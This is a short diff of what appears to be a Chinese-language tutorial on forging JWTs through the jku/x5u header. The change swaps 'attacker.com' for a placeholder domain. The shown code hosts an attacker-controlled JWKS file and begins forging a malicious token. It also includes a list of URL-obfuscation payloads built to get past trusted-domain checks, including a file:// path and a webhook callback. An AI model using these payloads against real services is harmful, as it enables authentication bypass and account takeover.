@@ -125,7 +125,7 @@ def host_jwks(jwk: dict) -> str:
     # 假设我们已有一个可控域名
     with open("/var/www/html/jwks.json", "w") as f:
         f.write(jwks_json)
-    return "https://attacker.com/jwks.json"
+    return "https://<attacker-domain>/jwks.json"
 
 # ─── 步骤 4: 构造恶意 JWT ───
 def forge_with_jku(payload: dict, private_key, jku_url: str) -> str:
@@ -190,11 +190,11 @@ print(f"[+] Status: {resp.status_code}")
 
 ```text
 # jku / x5u URL 混淆列表
-https://trusted.com.attacker.com/jwks.json
-https://trusted.com%40attacker.com/jwks.json
-https://attacker.com/trusted.com/jwks.json
-https://trusted.com/redirect?url=https://attacker.com/jwks.json
-https://trusted.com#@attacker.com/jwks.json
+https://trusted.com.<attacker-domain>/jwks.json
+https://trusted.com%40<attacker-domain>/jwks.json
+https://<attacker-domain>/trusted.com/jwks.json
+https://trusted.com/redirect?url=https://<attacker-domain>/jwks.json
+https://trusted.com#@<attacker-domain>/jwks.json
 http://localhost:8080/.well-known/jwks.json
 file:///etc/ssl/certs/jwt-public.pem
 https://webhook.site/<uuid>  # 用于观察是否有请求过来
